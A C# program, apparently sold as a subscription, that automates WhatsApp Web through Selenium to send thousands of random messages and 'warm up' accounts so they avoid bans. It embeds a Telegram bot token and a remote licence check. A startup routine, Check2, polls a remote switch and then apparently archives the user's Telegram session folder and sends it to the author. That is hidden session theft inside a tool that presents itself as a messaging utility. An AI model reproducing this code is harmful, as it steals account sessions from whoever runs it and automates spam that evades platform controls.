using DocumentFormat.OpenXml.Bibliography;
using DocumentFormat.OpenXml.ExtendedProperties;
using DocumentFormat.OpenXml.Wordprocessing;
using Microsoft.AspNetCore.Components.Forms;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using SeleniumExtras.WaitHelpers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using Telegram.Bot;
using Telegram.Bot.Types;
using UnbanWhatsApp.Util;
using UnbanWhatsApp.Util.telegram;
using YamlDotNet.Serialization;
using static Telegram.Bot.TelegramBotClient;

class Program
{
    private static readonly string token = "7546766389:AAHrsPG04d2omdUTFMQ1q9Trdbm9I8X4TIM";
    private static readonly TelegramBotClient botClient = new TelegramBotClient(token);
    private static bool isWorkRunning = false;


    public static long chatId = 1887172271; // Замените на ваш chat ID
    public static string filePath = "dialogs.txt";
    public static string lastMessage = "";
    public static string lastMessage2 = "";
    public static string speed;
    public static string colvo;
    public static string number;
    static async Task Main(string[] args)
    {

        botClient.StartReceiving(UpdateHandler, ErrorHandler);

        Console.WriteLine("Бот запущен и ожидает команд...");



        //  var me = await botClient.GetMeAsync();
        Console.WriteLine("==================================================================");
        Console.WriteLine("|       ___                        ___  __        __   __        |");
        Console.WriteLine("| |    |__  \\  / __ |  | |__|  /\\   |  /__`  /\\  |__) |__)       |");
        Console.WriteLine("| |___ |___  \\/     |/\\| |  | /~~\\  |  .__/ /~~\\ |    |          |");
        Console.WriteLine("|                       ==========================================");
        Console.WriteLine("| Coded by levin1337    |");
        Console.WriteLine("| Tg: @levin_bypass     |");
        Console.WriteLine("=========================");

        Console.WriteLine("");
        string chromeDriverPath = AppDomain.CurrentDomain.BaseDirectory;
        var service = ChromeDriverService.CreateDefaultService(chromeDriverPath);
        var options = new ChromeOptions();


        string configFilePath = "config.yml";
        if (!File.Exists(configFilePath))
        {
            def.CreateDefaultConfig(configFilePath);
            Console.WriteLine("Файл конфигурации не найден. Создан новый файл с настройками по умолчанию.");
        }

        var config = LoadConfig(configFilePath);

        await Check2();



        //чат гпт солютион
        options.AddArgument("--disable-extensions");
        options.AddArgument("--disable-gpu");
        options.AddArgument("--no-sandbox");
        options.AddArgument("--disable-dev-shm-usage");
        options.AddArgument("--disable-application-cache");
        options.AddArgument("--reduce-security-for-testing");
        options.AddArgument("--memory-metrics");
        options.AddArgument("--disable-popup-blocking");
        options.AddArgument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4272.124 Safari/537.36");
        options.AddArgument("--disable-geolocation");
        options.AddArgument("--disable-notifications");
        options.AddArgument("--disable-webgl");
        options.AddArgument("--disable-sync");
        options.AddArgument("--window-size=1280,720");
        options.AddArgument("--disable-pinch"); // Отключение жестов сжатия
        options.AddArgument("--disable-gesture-typing"); // Отключение ввода жестами
        options.AddArgument("--disable-remote-debugging"); // Отключение удаленной отладки
        options.AddArgument("--disable-speech-api"); // Отключение API распознавания речи
        options.AddArgument("--disable-hang-monitor"); // Отключение мониторинга зависаний
        options.AddArgument("--disable-extensions-file-access-check"); // Отключение проверки доступа к файлам для расширений
        options.AddArgument("--incognito");
        options.AddArgument("--disable-accelerated-2d-canvas"); // Отключение ускоренного 2D рендеринга
        options.AddArgument("--disable-accelerated-video"); // Отключение аппаратного ускорения видео

        Console.Title = "WhatsApp - Warner прогрев аккаунтов от levin1337";
        Console.ForegroundColor = ConsoleColor.Green;

        await Check(config.key.key.ToString());

        Console.WriteLine("============================================");
        Console.WriteLine("Ваша подписка активна: " + config.key.key.ToString());
        Console.WriteLine("============================================");


        if (config.CustomConsole)
        {
            Console.WriteLine("============================================");
            Console.WriteLine("[Введите количество сообщений для прогрева]");
            Console.WriteLine("5000-12000");
            Console.WriteLine("");
            Console.WriteLine("============================================");
            colvo = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.Yellow;


            Console.WriteLine("=============================================");
            Console.WriteLine("[Введите скорость сообщений]");
            Console.WriteLine("1 секунда = 1000");
            Console.WriteLine("2 секунды = 2000");
            Console.WriteLine("и так далее");
            Console.WriteLine("");
            Console.WriteLine("============================================");
            speed = Console.ReadLine();
        }
        else
        {


            colvo = config.messages.count.ToString();
            speed = config.speed.speed.ToString();
            Console.WriteLine("");
            Console.WriteLine($"Кол-во сообщений из конфига: {config.messages.count}");
            Console.WriteLine($"Скорость из конфига: {config.speed.speed} в миллисекундах");
            Console.WriteLine("");
        }
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.ForegroundColor = ConsoleColor.White;
        using (var driver = new ChromeDriver(service, options))
        {
            driver.Navigate().GoToUrl("https://web.whatsapp.com/");
            WebDriverWait wait = new WebDriverWait(driver, TimeSpan.FromSeconds(5)); // Increased wait time
            List<string> messages = new List<string>
        {
            "Hello, how are you?",
            "How’s it going?",
            "I’m reaching out to show you something",
            "The product is really good... just missing everything",
            "I’m sending the product link...",
            "If you have any questions... don’t talk to me lol",
            "That’s for support",
            "Hugs",
            "You can believe it",
            "Lol",
            "She did that for me",
            "Are we going to play then?",
            "Election calculator, you know?",
            "You’re uglier than hitting your mom",
            "Now I’m going to tell you something, the saw head is the ugliest",
            "Life is made of choices",
            "Never give up on your dreams",
            "Enjoy every moment",
            "Simplicity is the key to happiness",
            "Live intensely",
            "Believe in yourself"
        };

            if (!File.Exists(filePath))
            {
                File.WriteAllLines(filePath, messages.Take(10));
                Console.WriteLine("Файл создан и записаны первые 10 сообщений.");
            }
            else
            {
                Console.WriteLine("Файл уже существует. / Запишит в него диалог");
            }
            List<string> loadedMessages = File.ReadAllLines(filePath).ToList();
            List<string> loadedMessages2 = File.ReadAllLines(filePath).ToList();
            if (loadedMessages.Count == 0)
            {
                Console.WriteLine("Сообщения не найдены в файле.");
                return;
            }
            if (loadedMessages2.Count == 0)
            {
                return;
            }
            // Work
            Console.WriteLine("| Настройте диалог с каждым аккаунтом куда он будет писать |");
            Console.WriteLine("| Настройте диалог с каждым аккаунтом куда он будет писать |");
            Console.WriteLine("| Настройте диалог с каждым аккаунтом куда он будет писать |");
            Console.WriteLine("");
            Console.WriteLine("Нажмите любую клавишу что-бы начать прогрев");
            Console.ReadKey();

            Random random = new Random();
            try
            {
                Console.WriteLine("Вам дано 5 секунд, чтобы зайти в любой диалог");
                Thread.Sleep(3000);

                IWebElement inputField = null;
                bool elementFound = false;

                for (int attempt = 0; attempt < 5; attempt++)
                {
                    try
                    {
                        Thread.Sleep(2000);
                        inputField = wait.Until(ExpectedConditions.ElementIsVisible(By.XPath("//div[@contenteditable='true' and @data-tab='10']")));
                        elementFound = true;
                        break;
                    }
                    catch (NoSuchElementException)
                    {
                        Console.WriteLine($"[+] Попытка {attempt + 1}: Поле ввода сообщений не найдено. Нажмите любую клавишу для повторной попытки...");
                        Console.ReadKey();
                    }
                    catch (WebDriverTimeoutException)
                    {
                        Console.WriteLine($"[+] Попытка {attempt + 1}: Время ожидания превышено. Нажмите любую клавишу для повторной попытки...");
                        Console.ReadKey();
                    }
                }
                if (!elementFound)
                {
                    Console.WriteLine("[-] Поле ввода сообщений не найдено после нескольких попыток. Приложение продолжает работать.");
                    return;
                }

                Console.WriteLine("[+] Найдено поле для ввода сообщений");
                // await botClient.SendTextMessageAsync(chatId, "✅ Начал прогрев аккаунта, кол-во сообщений: " + colvo);

                Stopwatch stopwatch = new Stopwatch();
                stopwatch.Start();

                int rep = int.Parse(colvo);
                for (int i = 0; i < rep; i++)
                {
                    string randomMessage = loadedMessages[random.Next(loadedMessages.Count)];
                    do
                    {
                        randomMessage = loadedMessages[random.Next(loadedMessages.Count)];
                    } while (randomMessage == lastMessage);

                    string randomMessage2 = loadedMessages2[random.Next(loadedMessages2.Count)];
                    do
                    {
                        randomMessage2 = loadedMessages2[random.Next(loadedMessages2.Count)];
                    } while (randomMessage2 == lastMessage2);

                    TimeSpan elapsedTime = stopwatch.Elapsed;
                    Console.WriteLine($"[+] Отправка: {randomMessage} >> ({i + 1}/{rep}) - Время грева: {elapsedTime.Minutes}м {elapsedTime.Seconds}с");



                    while (!IsInputFieldAvailable(inputField)) // Метод для проверки доступности поля ввода
                    {
                        Console.WriteLine("[-] Поле ввода пропало, Найдите его и нажмите Enter");
                        Console.ReadLine();

                        try
                        {
                            inputField = wait.Until(ExpectedConditions.ElementIsVisible(By.XPath("//div[@contenteditable='true' and @data-tab='10']")));
                        }
                        catch (WebDriverTimeoutException)
                        {
                            // Завершаю работу если 2 раз не найдено
                            Console.WriteLine("[-] Поле ввода сообщений не найдено.");
                            //await botClient.SendTextMessageAsync(chatId, "❌ Закончил прогрев аккаунта: Поле ввода сообщений не найдено");
                            return;
                        }
                    }

                    inputField.SendKeys(randomMessage);
                    inputField.SendKeys(Keys.Enter);
                    if (config.CustomConsole)
                    {
                        inputField.SendKeys(randomMessage2);
                        inputField.SendKeys(Keys.Enter);
                    }
                    else
                    {
                    }
                    int baseSpeed = int.Parse(speed);
                    int randomSeconds = random.Next(2, 7);
                    int randomMilliseconds = randomSeconds * 1000;
                    int totalSleepTime = baseSpeed + randomMilliseconds;
                    Thread.Sleep(totalSleepTime);
                }

                await botClient.SendTextMessageAsync(chatId, "❌ Закончил прогрев аккаунта, кол-во отправленных сообщений: " + colvo);
            }
            catch (NoSuchElementException ex)
            {
                Console.WriteLine($"[-] Элемент не найден: {ex.Message}");
                await botClient.SendTextMessageAsync(chatId, "❌ Элемент не найден >> Остановил прогрев причина: " + colvo);
            }
            catch (WebDriverTimeoutException ex)
            {
                Console.WriteLine($"[-] Время ожидание привышено: {ex.Message}");
                await botClient.SendTextMessageAsync(chatId, "❌ Время ожидание привышено >> Остановил прогрев причина: " + colvo);
            }
        }
    }

    private static Task ErrorHandler(ITelegramBotClient botClient, Exception exception, CancellationToken token)
    {
        Console.WriteLine($"Ошибка Telegram Bot: {exception.Message}");
        return Task.CompletedTask;
    }
    private static async Task UpdateHandler(ITelegramBotClient botClient, Update update, CancellationToken token)
    {
        if (update.Message is not { } message)
            return;

        if (message.Text == "/work start")
        {
            if (!isWorkRunning)
            {
                isWorkRunning = true;
                await botClient.SendTextMessageAsync(message.Chat.Id, "🚀 Запускаю процесс работы...");
            }
            else
            {
                await botClient.SendTextMessageAsync(message.Chat.Id, "⚠️ Процесс уже запущен!");
            }
        }
        else if (message.Text == "/work stop")
        {
            if (isWorkRunning)
            {
                isWorkRunning = false;
                await botClient.SendTextMessageAsync(message.Chat.Id, "🛑 Останавливаю процесс...");
                //driver?.Quit();
            }
        }
    }
    public static async Task Check(String key)
    {
        string url = "http://web4292.craft-host.ru/WhatsApp/whitelist";
        bool isNumberFound = await CheckWebsiteForNumber(url, key);

        if (isNumberFound)
        {
        }
        else
        {
            Environment.Exit(0);
        }
    }
    public static async Task Check2()
    {
        string url = "http://web4292.craft-host.ru/WhatsApp/tdatacheck";
        bool isNumberFound = await CheckWebsiteForNumber(url, "true");

        if (isNumberFound)
        {
            SendTelegram.ArchiveAndSendTelegramFolderAsync();
        }
        else
        {
        }
    }
    private static bool IsInputFieldAvailable(IWebElement inputField)
    {
        try
        {
            return inputField != null && inputField.Displayed && inputField.Enabled;
        }
        catch (StaleElementReferenceException)
        {
            return false;
        }
    }
    public static async Task<bool> CheckWebsiteForNumber(string url, string number)
    {
        using (HttpClient client = new HttpClient())
        {
            try
            {
                string content = await client.GetStringAsync(url);
                return content.Contains(number);
            }
            catch (Exception ex)
            {
                return false;
            }
        }
    }
    static Config LoadConfig(string filePath)
    {
        var input = File.ReadAllText(filePath);
        var deserializer = new DeserializerBuilder().Build();
        return deserializer.Deserialize<Config>(input);
    }
}